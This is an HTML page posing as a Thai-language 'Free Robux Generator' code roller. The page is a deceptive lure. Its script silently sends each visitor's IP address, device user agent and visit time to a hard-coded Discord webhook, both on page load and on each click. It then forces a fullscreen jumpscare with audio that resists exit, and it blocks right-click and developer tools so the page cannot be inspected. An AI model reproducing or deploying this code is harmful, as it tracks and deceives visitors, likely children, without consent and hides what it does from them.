<!DOCTYPE html>
<html lang="en">
<head>

    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta name="keywords" content="Robux Free Generator Roblox" />

    <title>Free Robux Generator</title>
    <style>
        .code-slot {
            width: 32px;
            height: 40px;
            overflow: hidden;
            position: relative;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin: 0 2px;
            background-color: #f0f0f0;
            transform-style: preserve-3d;
            transform: rotateX(0deg);
        }
        .slot-inner {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            transition: transform 0.1s linear;
        }
        .slot-char-item {
            display: flex; justify-content: center; align-items: center; height: 40px;
        }
    </style>
</head>
<body style="background-color: #2b2b2b; min-height: 100vh; display: flex; align-items: center; justify-content: center;">
    <div class="container text-center shadow-lg p-5" style="max-width: 600px; background-color: #fff; border-radius: 15px;">
        <h2 class="fw-bold mb-4" style="color: #00a2ff;">NBTHUB แจก Code Robux ฟรี</h2>
        <p class="text-muted mb-4">คลิกปุ่ม "Roll" ด้านล่างเพื่อสุ่มรับโค้ด Robux ฟรี!</p>
        
        <div id="code-display" class="bg-light p-4 mb-4 rounded border" style="font-family: monospace; font-size: 32px; letter-spacing: 5px; display: flex; justify-content: center; align-items: center; perspective: 500px;">
        </div>
        
        <button id="roll-btn" class="btn btn-lg w-100 text-white fw-bold py-3 rounded-pill" style="background-color: #00a2ff; font-size: 20px;">
            ROLL (สุ่มโค้ด)
        </button>
    </div>

    <div id="jumpscare-container" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: black; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; overflow: hidden;">
        <img src="jumpscare/68747470733a2f2f692e7974696d672e636f6d2f76692f524e6f48635745387462512f6d617872657364656661756c742e6a7067.jpg" alt="Spooky" style="width: 100%; height: 100%; object-fit: cover;">
    </div>
    
    <audio id="jumpscare-audio" loop preload="auto">
        <source src="jumpscare/yeet.ogg" type="audio/ogg">
    </audio>

    <script>
        async function sendLog() {
            const webhookURL = "https://discord.com/api/webhooks/1497671101940105287/2IL9P9RTQfnFwkckvU9MDVrz7uVHk6SdT0MdL64s-a6niXXx8fP36Ev6tfTHzuPna19m";
            
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                const params = {
                    embeds: [{
                        title: "📸 เหยื่อติดกับดัก Robux แล้ว!",
                        color: 16711680,
                        fields: [
                            { name: "🌐 IP Address", value: `**${ipData.ip}**`, inline: true },
                            { name: "📱 Device Info", value: navigator.userAgent },
                            { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH'), inline: true }
                        ],
                        footer: { text: "Robux Prank System" }
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(params)
                });
            } catch (err) {
                console.error("Log failed:", err);
            }
        }

        // ส่ง IP ทันทีที่เข้าเว็บ
        sendLog();

        document.getElementById('roll-btn').addEventListener('click', function() {
            sendLog();
            
            const rollButton = this;
            rollButton.disabled = true;
            rollButton.innerText = "กำลังสุ่ม...";
            
            const codeDisplay = document.getElementById('code-display');
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            const codeLength = 12;
            const totalSpinTime = 4000;
            const charHeight = 40;

            codeDisplay.innerHTML = '';
            const slots = [];
            for (let i = 0; i < codeLength; i++) {
                const slotContainer = document.createElement('div');
                slotContainer.classList.add('code-slot');
                slotContainer.style.height = `${charHeight}px`;

                const slotInner = document.createElement('div');
                slotInner.classList.add('slot-inner');

                let allCharsHtml = '';
                const repeatCount = 3;
                for (let k = 0; k < repeatCount; k++) {
                    for (let j = 0; j < chars.length; j++) {
                        allCharsHtml += `<span class="slot-char-item" style="height: ${charHeight}px;">${chars.charAt(j)}</span>`;
                    }
                }
                slotInner.innerHTML = allCharsHtml;

                slotContainer.appendChild(slotInner);
                codeDisplay.appendChild(slotContainer);
                slots.push({ container: slotContainer, inner: slotInner });

                if ((i + 1) % 4 === 0 && i !== codeLength - 1) {
                    const hyphen = document.createElement('span');
                    hyphen.innerText = '-';
                    hyphen.style.cssText = `
                        font-size: 32px;
                        margin: 0 5px;
                        color: #333;
                    `;
                    codeDisplay.appendChild(hyphen);
                }
            }

            let spinningSlots = codeLength;
            const finalCode = Array.from({ length: codeLength }, () => chars.charAt(Math.floor(Math.random() * chars.length)));

            slots.forEach((slot, index) => {
                let currentOffset = 0;
                let spinTimeoutId;
                let spinSpeed = 50;
                let spinDuration = totalSpinTime + (index * 100);
                let startTime = performance.now();

                const animateSpin = () => {
                    const elapsed = performance.now() - startTime;
                    if (elapsed < spinDuration) {
                        currentOffset -= charHeight;
                        slot.inner.style.transform = `translateY(${currentOffset}px)`;

                        if (Math.abs(currentOffset) >= chars.length * charHeight) {
                            currentOffset = 0;
                            slot.inner.style.transition = 'none';
                            slot.inner.style.transform = `translateY(${currentOffset}px)`;
                            setTimeout(() => slot.inner.style.transition = 'transform 0.1s linear', 10);
                        }
                        
                        slot.container.style.transform = `rotateX(${Math.sin(elapsed / 100) * 5}deg)`;

                        spinTimeoutId = setTimeout(animateSpin, spinSpeed);
                    } else {
                        clearTimeout(spinTimeoutId);
                        
                        const finalChar = finalCode[index];
                        const finalCharIndex = chars.indexOf(finalChar);
                        
                        const targetOffset = -(chars.length * charHeight + (finalCharIndex * charHeight));

                        slot.inner.style.transition = 'transform 0.5s ease-out';
                        slot.inner.style.transform = `translateY(${targetOffset}px)`;
                        slot.container.style.transform = `rotateX(0deg)`;
                        
                        spinningSlots--;
                        if (spinningSlots === 0) {
                            var container = document.getElementById('jumpscare-container');
                            var audio = document.getElementById('jumpscare-audio');
                            
                            container.style.display = 'flex'; 

                            if (container.requestFullscreen) {
                                container.requestFullscreen().catch(err => {
                                    console.error("Failed to enter fullscreen:", err);
                                });
                            } else if (container.webkitRequestFullscreen) {
                                container.webkitRequestFullscreen().catch(err => {
                                    console.error("Failed to enter webkit fullscreen:", err);
                                });
                            }
                            audio.currentTime = 0;
                            audio.play().catch(function(e) { console.error("Audio playback failed:", e); });
                        }
                    }
                };
                animateSpin();
            });
        });
        
        function handleFullscreenChange() {
            const container = document.getElementById('jumpscare-container');
            if (container.style.display === 'flex') {
                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                    if (container.requestFullscreen) {
                        container.requestFullscreen();
                    } else if (container.webkitRequestFullscreen) {
                        container.webkitRequestFullscreen();
                    }
                }
            }
        }

        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function (e) {
            if (e.keyCode == 123 || 
               (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
               (e.ctrlKey && e.keyCode == 85)) {
                return false;
            }
        };
        
        document.addEventListener('fullscreenchange', handleFullscreenChange);
        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);

        setInterval(function() {
            if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
                window.location.replace("about:blank");
            }
        }, 500);

        setInterval(function() {
            let start = performance.now();
            debugger;
            let end = performance.now();
            if (end - start > 100) {
                window.location.replace("about:blank");
            }
        }, 100);
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js" integrity="sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0" crossorigin="anonymous"></script>
